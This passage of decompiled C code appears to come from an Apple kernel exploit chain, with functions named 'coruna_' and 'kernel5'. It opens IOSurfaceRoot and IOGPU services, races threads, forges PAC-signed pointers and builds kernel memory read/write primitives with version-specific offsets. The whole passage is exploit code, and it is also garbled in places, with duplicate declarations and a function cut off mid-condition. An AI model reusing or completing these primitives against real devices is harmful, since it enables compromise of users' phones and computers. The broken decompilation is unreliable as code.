            } while (port < *(uint *)((long)ctx + 0x2c8));
          }
          err = coruna_vm_map((long)ctx + 0x10);
          if (err != 0) {
            *(uint16_t *)((long)ctx + 0x2cc) = 0x101;
            if (*(int *)((long)ctx + 0x2c8) == 0) {
              return;
            }
            port = 0;
            do {
              _pthread_join(*(pthread_t *)(*(long *)((long)ctx + 0x2b8) + port * 8),
                            (void **)0x0);
              port = port + 1;
            } while (port < *(uint *)((long)ctx + 0x2c8));
            return;
          }
          *(uint8_t *)((long)ctx + 0x2cc) = 1;
          while (version = *(uint *)((long)ctx + 0x2c8), *(uint *)((long)ctx + 0x2d0) < version)
          {
            _thread_switch(0,2,1);
          }
          if (version != 0) {
            port = 0;
            do {
              if (port != *(uint *)((long)ctx + 0x2e8)) {
                err = _pthread_join(*(pthread_t *)(*(long *)((long)ctx + 0x2b8) + port * 8),
                                      (void **)0x0);
                if (err != 0) {
                  return;
                }
                version = *(uint *)((long)ctx + 0x2c8);
              }
              port = port + 1;
            } while (port < version);
          }
          size = size << (size < u);
        } while (*(int *)((long)ctx + 0x2e8) == -1);
        lk4 = _thread_suspend(*(thread_act_t *)((long)ctx + 0x300));
        if (lk4 == 0) {
          *(uint8_t *)((long)ctx + 0x634) = 1;
          *(uint8_t *)((long)ctx + 0x304) = 1;
        }
      }
    }
  }
  return;
}
void coruna_getpid(long handle)
{
  unsigned long u;
  int err;
  pid_t lp3;
  long handle;
  long scratch;
  unsigned long bootargs;
  unsigned long thread_attr;
  
  bootargs = 0;
  thread_attr = 0;
  err = coruna_kernel5_via_ioservicegetmatchingservice_4(handle + 0xf0,*(uint64_t *)(handle + 0x2a8),0,&thread_attr);
  if ((((err == 0) &&
       (handle = *(long *)(handle + 8), *(unsigned long *)(&k_kernel_slot_19e8 + handle) <= thread_attr)) &&
      (thread_attr < *(unsigned long *)(&k_kernel_slot_19f0 + handle))) &&
     ((*(unsigned long *)(handle + 0x158) < 0x1f530f02800000 ||
      (((err = coruna_kernel5_via_kernel5_via_ioservicegetmatchingservice_4(handle,thread_attr + 0x20,&thread_attr,0), err == 0 &&
        (handle = *(long *)(handle + 8), *(unsigned long *)(&k_kernel_slot_19e8 + handle) <= thread_attr)) &&
       (thread_attr < *(unsigned long *)(&k_kernel_slot_19f0 + handle))))))) {
    if (*(int *)(handle + 0x140) < 0x2258) {
      err = coruna_kernel5_via_kernel5_via_ioservicegetmatchingservice_4(handle,thread_attr + *(uint *)(handle + 0x250),&bootargs,0);
      if (err != 0) {
        return;
      }
      handle = *(long *)(handle + 8);
    }
    else {
      bootargs = thread_attr - *(uint *)(handle + 0x250);
    }
    u = bootargs;
    if ((*(unsigned long *)(&k_kernel_slot_19e8 + handle) <= bootargs) &&
       (bootargs < *(unsigned long *)(&k_kernel_slot_19f0 + handle))) {
      lp3 = _getpid();
      err = coruna_kernel5_via_kernel5_via_kernel5_via_ioservicegetmatchingservice_4_3(handle,u,lp3);
      if ((err != 0) &&
         ((err == 0x3f005 &&
          (err = coruna_kernel5_via_kernel5_via_ioservicegetmatchingservice_4(handle,thread_attr + *(uint *)(handle + 0x290),&scratch,0),
          err == 0)))) {
        if (*(int *)(*(long *)(handle + 8) + 0x140) < 0x2258) {
          err = coruna_kernel5_via_kernel5_via_ioservicegetmatchingservice_4(handle,scratch + (unsigned long)*(uint *)(handle + 0x250),&bootargs,0);
          if (err != 0) {
            return;
          }
        }
        else {
          bootargs = scratch - (unsigned long)*(uint *)(handle + 0x250);
        }
        u = bootargs;
        lp3 = _getpid();
        coruna_kernel5_via_kernel5_via_kernel5_via_ioservicegetmatchingservice_4_3(handle,u,lp3);
      }
    }
  }
  return;
}
void coruna_kernel5_via_vm_deallocate(long handle)
{
  int err;
  long scratch;
  
  scratch = 0;
  err = coruna_memmem(handle,*(uint64_t *)(handle + 0x2f0),&scratch);
  if ((err == 0) && (scratch == *(long *)(handle + 0x2f8))) {
    coruna_vm_deallocate(handle + 0x10);
  }
  return;
}
void coruna_open_iosurface_root_aae0(long handle)
{
  int *err;
  long handle;
  uint u;
  mach_port_t lm4;
  int err;
  int status;
  uint size;
  unsigned long *ptr;
  void **lppv9;
  unsigned long version;
  long addr;
  uint64_t port;
  long off;
  unsigned long tag;
  pthread_t p_Var15;
  pthread_t *pp_Var16;
  uint64_t *buf;
  uint *str;
  void *ptr;
  unsigned long *copy;
  uint scratch;
  unsigned long bootargs;
  long thread_attr;
  long host_info;
  long serial_buf;
  uint action;
  unsigned long block_ctx [16];
  pthread_t stack_guard [17];
  long sa_saved;
  
  sa_saved = *(long *)k_kernel_stack_chk_guard_slot;
  str = *(uint **)(handle + 8);
  tag = *(unsigned long *)(str + 0x56);
  if (tag >> 0x2b < 1099) {
    if ((0x1f530f027fffff < tag) && ((*str & 0x5584001) != 0 || 0x1f5418ffffffff < tag)) {
      block_ctx[0] = 0;
      action = 0;
      host_info = 0;
      serial_buf = 0;
      bootargs = 0;
      thread_attr = 0;
      err = _pthread_mutex_init((pthread_mutex_t *)(handle + 0x6d0),(pthread_mutexattr_t *)0x0);
      if (err == 0) {
        off = 0x100;
        if ((int)str[0x50] < 0x2258) {
          off = 0x118;
        }
        handle = 0x108;
        if ((int)str[0x50] < 0x2258) {
          handle = 0x120;
        }
        addr = _IOServiceMatching("IOSurfaceRoot");
        if (addr != 0) {
          port = _IOServiceGetMatchingService
                             (*(uint32_t *)k_kernel_kiomasterportdefault_slot,addr);
          *(int *)(handle + 0x67c) = (int)port;
          if (1 < (int)port + 1U) {
            err = (int *)(handle + 0x680);
            err = _IOServiceOpen(port,*(uint32_t *)k_kernel_mach_task_self_slot,0,err);
            if ((err == 0) && (1 < *err + 1U)) {
              addr = coruna_kernel5_via_kernel5_via_pacia_5(*(uint64_t *)(handle + 8));
              *(long *)(handle + 0x688) = addr;
              if (addr != 0) {
                err = 8;
                do {
                  status = coruna_dlopen_iosurface_c870(str,*err,&action);
                  if ((((((status != 0) ||
                         (status = coruna_kernel5_via_kernel5_via_ioservicegetmatchingservice_4(handle,*(long *)(handle + 0x688) + handle,block_ctx,
                                               1), size = action, status != 0)) ||
                        (block_ctx[0] <= action)) ||
                       ((status = coruna_kernel5_via_kernel5_via_ioservicegetmatchingservice_4(handle,*(long *)(handle + 0x688) + off,&host_info
                                              ,0), status != 0 ||
                        (addr = coruna_pacia(str,host_info), addr == 0)))) ||
                      ((status = coruna_kernel5_via_kernel5_via_ioservicegetmatchingservice_4(handle,host_info + (unsigned long)(size << 3),&thread_attr,0),
                       status != 0 ||
                       ((addr = coruna_pacia(str,thread_attr), addr == 0 ||
                        (status = coruna_kernel5_via_kernel5_via_ioservicegetmatchingservice_4(handle,thread_attr + 0x40,&bootargs,0), status != 0))))
                      )) || (addr = coruna_pacia(str,bootargs), addr == 0)) break;
                  if (0x4ff < (unsigned long)str[0x60] - (*(unsigned long *)(str + 0x62) & bootargs)) {
                    *(unsigned long *)(handle + 0x690) = bootargs;
                    *(uint *)(handle + 0x6c8) = size;
                    err = coruna_kernel5_via_kernel5_via_ioservicegetmatchingservice_4(handle,*(long *)(handle + 0x688) + 0x88,&serial_buf,0);
                    if (((err != 0) ||
                        (off = coruna_pacia(*(uint64_t *)(handle + 8),serial_buf), off == 0)
                        ) || (err = coruna_kernel5_via_helper_6094_7600(handle,serial_buf + 8,0), err != 0)) break;
                    if (0x2257ffffffffff < *(unsigned long *)(str + 0x56)) {
                      stack_guard[0] = (pthread_t)0x0;
                      err = coruna_kernel5_via_kernel5_via_ioservicegetmatchingservice_4(handle,*(long *)(handle + 0x688) + 0x11c,stack_guard,1);
                      if (err != 0) break;
                      u = (uint)stack_guard[0];
                      size = (uint)stack_guard[0] >> 0x18;
                      if (size == 1) {
                        off = *(long *)(handle + 0x688) + 0x11c;
                        stack_guard[0] = (pthread_t)0x0;
                        if (*(char *)(handle + 0x304) == '\0') {
                          err = coruna_kernel5_via_vm_map(handle + 0x10,off,stack_guard);
                        }
                        else {
                          err = coruna_memmem(handle,off,stack_guard);
                        }
                        if ((err != 0) || (stack_guard[0] == (pthread_t)0x0)) break;
                        size = coruna_kernel5_via_ioservicegetmatchingservice_3(handle + 0xf0,stack_guard[0],u & 0xffffff);
                      }
                      if (size != 0) break;
                    }
                    *(uint8_t *)(handle + 0x678) = 1;
                    break;
                  }
                  err = err + -1;
                } while (err != 0);
              }
            }
          }
        }
      }
    }
  }
  else {
    tag = 0;
    stack_guard[0xd] = (pthread_t)0x0;
    stack_guard[0xc] = (pthread_t)0x0;
    stack_guard[0xf] = (pthread_t)0x0;
    stack_guard[0xe] = (pthread_t)0x0;
    stack_guard[9] = (pthread_t)0x0;
    stack_guard[8] = (pthread_t)0x0;
    stack_guard[0xb] = (pthread_t)0x0;
    stack_guard[10] = (pthread_t)0x0;
    stack_guard[5] = (pthread_t)0x0;
    stack_guard[4] = (pthread_t)0x0;
    stack_guard[7] = (pthread_t)0x0;
    stack_guard[6] = (pthread_t)0x0;
    stack_guard[1] = (pthread_t)0x0;
    stack_guard[0] = (pthread_t)0x0;
    stack_guard[3] = (pthread_t)0x0;
    stack_guard[2] = (pthread_t)0x0;
    block_ctx[0xd] = 0;
    block_ctx[0xc] = 0;
    block_ctx[0xf] = 0;
    block_ctx[0xe] = 0;
    block_ctx[9] = 0;
    block_ctx[8] = 0;
    block_ctx[0xb] = 0;
    block_ctx[10] = 0;
    block_ctx[5] = 0;
    block_ctx[4] = 0;
    block_ctx[7] = 0;
    block_ctx[6] = 0;
    scratch = 0x28008;
    block_ctx[1] = 0;
    block_ctx[0] = 0;
    block_ctx[3] = 0;
    block_ctx[2] = 0;
    do {
      ptr = _calloc(1,0x30);
      block_ctx[tag] = (unsigned long)ptr;
      if (ptr == (unsigned long *)0x0) {
        size = 0xad009;
        goto fail;
      }
      lppv9 = (void **)coruna_kernel5_via_pacia_16(coruna_kernel5_residual_219);
      u = _pthread_create(stack_guard + tag,(pthread_attr_t *)0x0,lppv9,ptr);
      if (u != 0) {
        ptr = (unsigned long *)0x0;
        size = -u;
        if (-1 < (int)u) {
          size = u;
        }
        size = size | 0x40000000;
done:
        if (0 < (int)tag) goto cleanup;
        goto check_ok;
      }
      lm4 = _pthread_mach_thread_np(stack_guard[tag]);
      size = scratch;
      if (lm4 + 1 < 2) {
fail:
        ptr = (unsigned long *)0x0;
        goto done;
      }
      *(mach_port_t *)(ptr + 3) = lm4;
      if (*(char *)((long)ptr + 0x29) == '\0') {
        err = 0x3ea;
        do {
          err = err + -1;
          if (err == 0) {
            ptr = (unsigned long *)0x0;
            size = 0x1001;
            goto done;
          }
          coruna_semaphore_timedwait(str,1000);
        } while (*(char *)((long)ptr + 0x29) == '\0');
      }
      version = coruna_kernel5_via_kernel5_via_pacia_5(str,lm4);
      size = 0x28026;
      if (version == 0) goto fail;
      if (((version + 0x5f0 ^ version) & (*(unsigned long *)(str + 0x62) ^ 0xffffffffffffffff)) == 0) {
        size = 0;
        p_Var15 = stack_guard[tag];
        block_ctx[tag] = 0;
        stack_guard[tag] = (pthread_t)0x0;
        tag = (unsigned long)((int)tag + 1);
        *ptr = version;
        ptr[2] = (unsigned long)p_Var15;
        goto done;
      }
      tag = tag + 1;
    } while (tag != 0x10);
    ptr = (unsigned long *)0x0;
    size = 0xad011;
cleanup:
    pp_Var16 = stack_guard;
    copy = block_ctx;
    tag = tag & 0xffffffff;
    do {
      ptr = (void *)*copy;
      if (((ptr != (void *)0x0) && (1 < *(int *)((long)ptr + 0x18) + 1U)) &&
         (*pp_Var16 != (pthread_t)0x0)) {
        *(uint8_t *)((long)ptr + 0x28) = 1;
        ___ulock_wake(0x201,(long)ptr + 0x1c);
        _pthread_join(*pp_Var16,(void **)0x0);
        *pp_Var16 = (pthread_t)0x0;
        _free(ptr);
        *copy = 0;
      }
      pp_Var16 = pp_Var16 + 1;
      copy = copy + 1;
      tag = tag - 1;
    } while (tag != 0);
check_ok:
    if (size == 0) {
      *(unsigned long **)(str + 0x752) = ptr;
      buf = *(uint64_t **)(&k_kernel_slot_1d48 + *(long *)(handle + 8));
      err = coruna_memmem(handle,*buf,buf + 1);
      if (((err == 0) &&
          (err = _pthread_mutex_init((pthread_mutex_t *)(handle + 0x6d0),
                                       (pthread_mutexattr_t *)0x0), err == 0)) &&
         ((err = coruna_pacia_12(*(uint64_t *)(handle + 8),0x5584201), err == 0 ||
          ((err = coruna_kernel5_via_ctx_clear_12bc4(*(uint64_t *)(handle + 8),0), err == 0 &&
           (err = coruna_kernel5_via_mach_vm_machine_attribute_2(*(uint64_t *)(handle + 8),*(uint32_t *)(buf + 3),1,0,0x60)
           , err == 0)))))) {
        *(uint16_t *)(handle + 0x678) = 0x101;
      }
    }
  }
  if (*(long *)k_kernel_stack_chk_guard_slot != sa_saved) {
    ___stack_chk_fail();
  }
  return;
}
void coruna_pthread_join(long handle)
{
  int err;
  uint64_t *ptr;
  
  if (*(long *)(&k_kernel_slot_1d40 + handle) != 0) {
    *(uint64_t *)(&k_kernel_slot_1d40 + handle) = 0;
    err = coruna_pthread_from_mach_thread_np();
    if (err != 0) {
      return;
    }
  }
  ptr = *(uint64_t **)(&k_kernel_slot_1d48 + handle);
  if (ptr != (uint64_t *)0x0) {
    *(uint64_t *)(&k_kernel_slot_1d48 + handle) = 0;
    *(uint8_t *)(ptr + 5) = 1;
    ___ulock_wake(0x201,(long)ptr + 0x1c,*(uint32_t *)(ptr + 3));
    _pthread_join((pthread_t)ptr[2],(void **)0x0);
    ptr[1] = 0;
    *ptr = 0;
    ptr[3] = 0;
    ptr[2] = 0;
    ptr[5] = 0;
    ptr[4] = 0;
    _free(ptr);
  }
  return;
}
void coruna_kernel5_via_kernel5_via_thread_get_state(long handle,uint64_t val,uint64_t id_2,uint32_t size)
{
  long handle;
  
  if ((*(long *)(&k_kernel_slot_1d40 + handle) != 0) && (handle = coruna_kernel5_residual_225(), handle != 0)) {
    coruna_kernel5_via_thread_get_state(*(uint64_t *)(&k_kernel_slot_1d40 + handle),val,size,id_2);
  }
  return;
}
void coruna_kernel5_via_thread_switch(long handle,unsigned long arg,uint32_t *size,uint size_x)
{
  long handle;
  size_t ls2;
  unsigned long u;
  int err;
  long addr;
  unsigned long size;
  unsigned long version;
  unsigned long port;
  unsigned long tag;
  long off;
  unsigned long kind;
  size_t ls12;
  long base;
  long scratch;
  
  if ((*(long *)(&k_kernel_slot_1d40 + handle) != 0) && (addr = coruna_kernel5_residual_225(), addr != 0)) {
    addr = *(long *)(&k_kernel_slot_1d40 + handle);
    port = (unsigned long)size_x;
    if (*(char *)(addr + 0x678) == '\0') {
      version = *(unsigned long *)k_kernel_vm_page_mask_slot;
      tag = arg & (version ^ 0xffffffffffffffff);
      port = port + arg;
      size = port & (version ^ 0xffffffffffffffff);
      if (tag <= size) {
        kind = version & arg;
        version = version & port;
        if (tag != size) {
          version = *(long *)k_kernel_vm_page_size_slot - 1;
        }
        off = version - kind;
        if (off != 0) {
          version = tag;
          do {
            if (*(char *)(addr + 0x304) == '\0') {
              err = coruna_kernel5_via_vm_map(addr + 0x10,version,&scratch);
            }
            else {
              err = coruna_memmem(addr,version,&scratch);
            }
            if (err != 0) {
              return;
            }
            if (scratch == 0) {
              return;
            }
            err = coruna_kernel5_via_ioservicegetmatchingservice(addr + 0xf0,scratch + kind,off,size);
            if (err != 0) {
              return;
            }
            version = *(long *)k_kernel_vm_page_size_slot + version;
            if (size < version) {
              return;
            }
            size = (uint32_t *)((long)size + off);
            kind = *(unsigned long *)k_kernel_vm_page_mask_slot & arg;
            if (version != tag) {
              kind = 0;
            }
            u = *(unsigned long *)k_kernel_vm_page_mask_slot & port;
            if (version != size) {
              u = *(long *)k_kernel_vm_page_size_slot - 1;
            }
            off = u - kind;
          } while (off != 0);
        }
      }
    }
    else if ((((arg & 3) == 0) && (size_x == 4)) && (*(char *)(addr + 0x679) != '\0')) {
      coruna_thread_switch(addr,arg,*size);
    }
    else {
      tag = arg & 0xfffffffffffffff8;
      size = arg & 7;
      version = (size + port + 7 & 0x1fffffff8) + tag;
      ls2 = port;
      if (8 - size <= port) {
        ls2 = 8 - size;
      }
      if (tag < version) {
        off = 0;
        base = 0;
        do {
          handle = tag + off;
          if ((tag == arg) || (off != 0)) {
            if (((size_x + (int)arg & 7) == 0) || (handle + 8U < version)) {
              ls12 = port - base;
              if (7 < ls12) {
                ls12 = 8;
              }
            }
            else {
              err = coruna_kernel5_via_thread_get_state_2(addr,handle,&scratch,1);
              if (err != 0) {
                return;
              }
              ls12 = port - base;
            }
            ___memcpy_chk(&scratch,(long)size + base,ls12,8);
          }
          else {
            err = coruna_kernel5_via_thread_get_state_2(addr,tag,&scratch,1);
            if (err != 0) {
              return;
            }
            _memcpy((void *)((unsigned long)&scratch | size),(void *)((long)size + base),ls2);
            ls12 = ls2;
          }
          err = coruna_ioconnectcallscalarmethod(addr,handle,scratch);
          if (err != 0) {
            return;
          }
          base = ls12 + base;
          off = off + 8;
        } while (tag + off < version);
      }
    }
  }
  return;
}
void coruna_kernel5_via_ioconnectcallscalarmethod(long handle,uint64_t val,uint64_t id_2)
{
  long handle;
  
  if ((*(long *)(&k_kernel_slot_1d40 + handle) != 0) && (handle = coruna_kernel5_residual_225(), handle != 0)) {
    handle = *(long *)(&k_kernel_slot_1d40 + handle);
    if (*(char *)(handle + 0x678) == '\0') {
      coruna_kernel5_via_helper_6094_7600(handle,val,id_2);
    }
    else {
      coruna_ioconnectcallscalarmethod(handle,val,id_2);
    }
  }
  return;
}
void coruna_ioconnectcallscalarmethod(long handle)
{
  uint64_t *ptr;
  long *ptr;
  uint u;
  uint32_t size;
  uint32_t version;
  uint8_t size[16];
  unsigned long port;
  unsigned long *buf;
  bool err;
  int err;
  kern_return_t lk11;
  int status;
  void *buf;
  void *str;
  void *copy;
  uint *str;
  unsigned long tag;
  unsigned long kind;
  long handle;
  uint64_t *copy;
  long addr;
  unsigned long type_id;
  uint64_t type_id_8;
  unsigned long *data;
  unsigned long type_id_9;
  unsigned long type_id_10;
  unsigned long type_id_11;
  unsigned long type_id_12;
  byte *data;
  int *err;
  byte *obj;
  long off;
  long base;
  long *block;
  unsigned long type_id_13;
  int *status;
  char *ptr;
  uint8_t *obj;
  unsigned long type_id_14;
  unsigned long type_id_15;
  long ctx_val;
  long serial;
  uint64_t *block;
  uint type_id_16;
  uint64_t type_id_17;
  uint64_t type_id_18;
  uint64_t type_id_19;
  uint64_t type_id_20;
  unsigned long scratch;
  unsigned long bootargs;
  long thread_attr;
  long host_info;
  long serial_buf;
  long action;
  long block_ctx;
  long stack_guard [3];
  vm_address_t sa_saved;
  uint64_t scratch;
  uint64_t sa_new;
  unsigned long path_buf;
  uint64_t bootargs;
  uint64_t tmp_buf;
  uint64_t region;
  uint8_t plist[12];
  uint32_t url_buf;
  unsigned long json_buf [2];
  unsigned long frame;
  unsigned long thread_attr;
  vm_prot_t work;
  uint32_t host_info;
  uint cache;
  unsigned long cache_20 [2];
  unsigned long *cache_21;
  uint64_t serial_buf;
  uint64_t cache_22;
  uint64_t cache_23;
  uint64_t action;
  uint64_t cache_24;
  uint64_t block_ctx;
  uint64_t cache_25;
  uint64_t stack_guard;
  uint64_t cache_26;
  uint64_t sa_saved;
  uint64_t cache_27;
  uint64_t sa_new;
  uint64_t cache_28;
  uint64_t path_buf;
  uint64_t cache_29;
  uint64_t tmp_buf;
  uint64_t cache_30;
  uint64_t region;
  uint64_t cache_31;
  uint64_t plist;
  uint64_t cache_32;
  uint64_t url_buf;
  uint64_t cache_33;
  uint64_t json_buf;
  uint64_t cache_34;
  uint64_t frame;
  uint64_t cache_35;
  uint64_t work;
  uint64_t cache_36;
  uint64_t cache;
  uint64_t cache_37;
  uint64_t cache_20;
  uint64_t cache_38;
  uint64_t cache_39;
  uint64_t cache_40;
  uint64_t cache_21;
  uint64_t cache_22;
  uint64_t cache_23;
  unsigned long cache_24;
  uint64_t cache_25;
  uint64_t cache_41;
  uint64_t cache_26;
  uint64_t cache_42;
  uint64_t cache_27;
  uint64_t cache_43;
  uint64_t cache_28;
  uint64_t cache_44;
  uint64_t cache_29;
  uint64_t cache_45;
  uint64_t cache_30;
  uint64_t cache_46;
  uint64_t cache_31;
  uint64_t cache_47;
  uint64_t cache_32;
  uint64_t cache_48;
  uint64_t cache_33;
  uint64_t cache_49;
  uint64_t cache_34;
  uint64_t cache_50;
  long cache_51;
  uint64_t cache_52;
  uint64_t cache_35;
  uint64_t cache_53;
  uint64_t cache_36;
  uint64_t cache_54;
  uint64_t cache_37;
  uint64_t cache_55;
  uint64_t cache_38;
  uint64_t cache_56;
  uint64_t cache_57;
  uint64_t cache_39;
  uint32_t cache_58;
  uint32_t cache_40;
  uint32_t cache_41;
  unsigned long cache_59;
  long cache_60;
  int *flags;
  
  cache_60 = *(long *)k_kernel_stack_chk_guard_slot;
  if ((((*(unsigned long *)(handle + 0x158) < 0x225c23801af00d) ||
       (err = coruna_fn_ptr_cast_10(handle,0x5184000), err == 0)) ||
      (*(long *)(&k_kernel_slot_1d58 + handle) != 0)) ||
     if (*(long *)k_kernel_stack_chk_guard_slot == cache_60) {
     return;
     }
     ___stack_chk_fail();
}
void coruna_kernel5_via_helper_6094_7600(long handle,uint64_t val,uint64_t id_2)
{
  int err;
  long scratch;
  
  scratch = 0;
  if (*(char *)(handle + 0x304) == '\0') {
    err = coruna_kernel5_via_vm_map(handle + 0x10,val,&scratch);
  }
  else {
    err = coruna_memmem(handle,val,&scratch);
  }
  if ((err == 0) && (scratch != 0)) {
    coruna_helper_6094_7600(handle + 0xf0,scratch,id_2);
  }
  return;
}
void coruna_ioservicegetmatchingservice_bbd4(long handle)
{
  uint32_t u;
  int err;
  uint64_t size;
  long handle;
  long addr;
  long off;
  mach_port_name_t name;
  long base;
  bool err;
  unsigned long scratch;
  mach_port_name_t bootargs;
  uint32_t scratch;
  uint64_t thread_attr;
  long host_info;
  uint64_t serial_buf;
  uint64_t action;
  long block_ctx;
  
  err = coruna_mach_absolute_time_1a9c0(handle,2,&k_kernel_slot_2710);
  if (err != 0) {
    return;
  }
  action = 0;
  block_ctx = 0;
  host_info = 0;
  serial_buf = 0;
  thread_attr = 0;
  base = *(long *)(&k_kernel_slot_1d40 + handle);
  {
    coruna_kernel5_residual_251(handle,2);
    return;
  }
  bootargs = 0;
  coruna_ioconnectcallstructmethod(handle,&bootargs);
  if (bootargs + 1 < 2) {
    bootargs = 0;
    u = *(uint32_t *)k_kernel_kiomasterportdefault_slot;
    size = _IOServiceMatching("IOGPU");
    size = _IOServiceGetMatchingService(u,size);
    {
      coruna_kernel5_residual_251(handle,2);
      return;
    }
    _IOServiceOpen(size,*(uint32_t *)k_kernel_mach_task_self_slot,1,&bootargs);
    _IOObjectRelease(size);
    {
      coruna_kernel5_residual_251(handle,2);
      return;
    }
    err = false;
  }
  else {
    if ((((*(long *)(base + 0x6c0) != 0) && (*(long *)(base + 0x6a8) != 0)) &&
        (*(long *)(base + 0x6b0) != 0)) && (name = bootargs, *(long *)(base + 0x6b8) != 0))
    {
      *(mach_port_name_t *)(base + 0x680) = name;
      *(uint8_t *)(base + 0x67a) = 1;
      coruna_kernel5_residual_251(handle,2);
      return;
    }
    err = true;
  }
  name = bootargs;
  handle = coruna_kernel5_via_kernel5_via_pacia_5(handle,bootargs);
  if (((((handle != 0) && (err = coruna_kernel5_residual_257(handle,handle + 0x120,&block_ctx), err != 0)) &&
       ((addr = coruna_pacia(handle,block_ctx), addr != 0 &&
        ((err = coruna_memmem(base,block_ctx + 0xd0,&action), err == 0 &&
         (err = coruna_kernel5_residual_257(handle,block_ctx + 0xd0,&serial_buf), err != 0)))))) &&
      ((err = coruna_kernel5_residual_257(handle,block_ctx + 0x10,&host_info), err != 0 &&
       (((((addr = coruna_pacia(handle,host_info), addr != 0 &&
           (err = coruna_kernel5_residual_257(handle,host_info + 0x10,&thread_attr), err != 0)) &&
          (addr = coruna_pacia(handle,thread_attr), addr != 0)) &&
         ((*(long *)(&k_kernel_slot_19d0 + handle) != 0 && (addr = coruna_kernel5_via_pacia_5(handle), addr != 0))))
        && (addr = coruna_call_macho_data_seg(handle,addr,1), addr != 0)))))) &&
     (((err = *(int *)(handle + 0x140), err == 0x2258 || (err == 0x2712)) ||
      (err == 0x225c)))) {
    err = coruna_pacia_12(handle,0x1100000);
    if (err == 0) {
      err = coruna_pacia_12(handle,0x84001);
      if (err == 0) {
        err = coruna_pacia_12(handle,&k_kernel_slot_2240);
        if (err == 0) goto code_r0x0000bf48;
        off = 0x3a8;
      }
      else {
        off = 0x3c0;
      }
    }
    else {
      off = 0x3d8;
    }
    err = coruna_ret_stub_6(handle,off + addr,8,&scratch);
    if ((((err != 0) && (scratch != 0)) && ((scratch & 7) == 0)) &&
       ((err || (((err = coruna_kernel5_residual_258(handle,block_ctx + 0x50,addr), err != 0 &&
                    (err = coruna_kernel5_residual_257(handle,handle + 0x88,&bootargs), err != 0)) &&
                   ((handle = coruna_pacia(handle,coruna_u64_pack((scratch), (bootargs))), handle != 0 &&
                    (err = coruna_kernel5_residual_258(handle,coruna_u64_pack((scratch), (bootargs)) + 8,0), err != 0)))
                   ))))) {
      *(unsigned long *)(base + 0x6c0) = scratch;
      *(uint64_t *)(base + 0x6a8) = serial_buf;
      *(uint64_t *)(base + 0x6b0) = action;
      *(uint64_t *)(base + 0x6b8) = thread_attr;
done:
      *(mach_port_name_t *)(base + 0x680) = name;
      *(uint8_t *)(base + 0x67a) = 1;
      coruna_kernel5_residual_251(handle,2);
      return;
    }
  }
code_r0x0000bf48:
  _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,name);
fail:
  coruna_kernel5_residual_251(handle,2);
  return;
}
void coruna_kernel5_via_pacia_12(long handle)
{
  int err;
  int status;
  uint32_t u;
  unsigned long size;
  uint32_t version;
  int flags;
  int count;
  long handle;
  
  handle = *(long *)(handle + 8);
  err = *(int *)(handle + 0x140);
  if (err < 0x2258) {
    if (1 < err - 0x1f53U && err != 0x1c1b) {
      return;
    }
    err = coruna_pacia_12(handle,0x5584001);
    if (err == 0) {
      status = coruna_pacia_12(handle,0xa040);
      size = *(unsigned long *)(handle + 0x158);
      err = 0x380;
      if (size < 0x1f530f02800000) {
        err = 0x3f0;
      }
      flags = 0x430;
      count = 0x3c0;
fail:
      if (size < 0x1f530f02800000) {
        count = flags;
      }
      if (status != 0) {
        err = count;
      }
    }
    else {
      err = coruna_pacia_12(handle,0x100000);
      if (err == 0) {
        status = coruna_pacia_12(handle,0x84000);
        size = *(unsigned long *)(handle + 0x158);
        err = 0x390;
        if (size < 0x1f530f02800000) {
          err = 0x400;
        }
        flags = 0x408;
        count = 0x398;
        goto fail;
      }
      size = *(unsigned long *)(handle + 0x158);
      err = 0x3a0;
      if (size < 0x1f530f02800000) {
        err = 0x410;
      }
    }
    *(int *)(handle + 0x24c) = err;
    if (0x1f541dffffffff < size) {
      *(int *)(handle + 0x24c) = err + -8;
    }
  }
  else {
    if ((err != 0x2258 && err != 0x225c) && err != 0x2712) {
      return;
    }
    err = coruna_kernel5_via_pacia_12_18(handle);
    *(int *)(handle + 0x24c) = err;
    if (err == 0) {
      return;
    }
  }
  handle = *(long *)(handle + 8);
  err = *(int *)(handle + 0x140);
  if (err < 0x2258) {
    if (1 < err - 0x1f53U && err != 0x1c1b) {
      return;
    }
  }
  else if ((err != 0x2258 && err != 0x2712) && err != 0x225c) {
    return;
  }
  err = coruna_pacia_12(handle,0x5584001);
  u = 0xb8;
  if (err == 0) {
    err = coruna_pacia_12(handle,0x200);
    u = 0x100;
    if (err != 0) {
      u = 0xb8;
    }
  }
  *(uint32_t *)(handle + 0x29c) = u;
  err = coruna_kernel5_via_pacia_12_15(*(uint64_t *)(handle + 8));
  if (err == 0) {
    return;
  }
  *(int *)(handle + 0x250) = err;
  handle = *(long *)(handle + 8);
  err = *(int *)(handle + 0x140);
  if (err < 0x2258) {
    if (err - 0x1f53U < 2) {
      u = 0xf0;
      if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
        u = 0x118;
      }
    }
    else {
      if (err != 0x1c1b) {
        return;
      }
      u = 0x110;
    }
  }
  else {
    if (((err != 0x2258) && (err != 0x225c)) && (err != 0x2712)) {
      return;
    }
    u = 0xe8;
  }
  *(uint32_t *)(handle + 0x254) = u;
  err = *(int *)(handle + 0x140);
  if (err < 0x2258) {
    if (err == 0x1c1b) {
      u = 0x25c0;
    }
    else if (err == 0x1f53) {
      u = 0x2610;
      if (*(unsigned long *)(handle + 0x158) < 0x1f531400000000) {
        u = 0x2600;
      }
    }
    else {
      if (err != 0x1f54) {
        return;
      }
      u = 0x2600;
    }
  }
  else {
    if (err == 0x2258) {
      err = coruna_pacia_12(handle,0x5584201);
      version = 0x26e0;
      u = 0x26d0;
    }
    else {
      if (err == 0x225c) {
        u = 0x26b0;
        {
          *(uint32_t *)(handle + 0x244) = u;
          handle = *(long *)(handle + 8);
          err = *(int *)(handle + 0x140);
          u = 0x30;
          if (err < 0x2258) {
          if ((1 < err - 0x1f53U) && (err != 0x1c1b)) {
          return;
          }
          }
          else if ((err != 0x2258) && (err != 0x225c)) {
          if (err != 0x2712) {
          return;
          }
          u = 0x28;
          }
          *(uint32_t *)(handle + 0x248) = u;
          err = *(int *)(handle + 0x140);
          if (err < 0x2258) {
          if (1 < err - 0x1f53U) {
          if (err != 0x1c1b) {
          return;
          }
          u = 0xf8;
          {
          *(uint32_t *)(handle + 600) = u;
          *(uint64_t *)(handle + 0x25c) = k_kernel_rodata_word_33670;
          *(uint64_t *)(handle + 0x268) = k_kernel_rodata_word_33678;
          u = 0x10;
          *(uint32_t *)(handle + 0x270) = 0x10;
          err = *(int *)(handle + 0x140);
          if (err < 0x2258) {
          u = 0x18;
          }
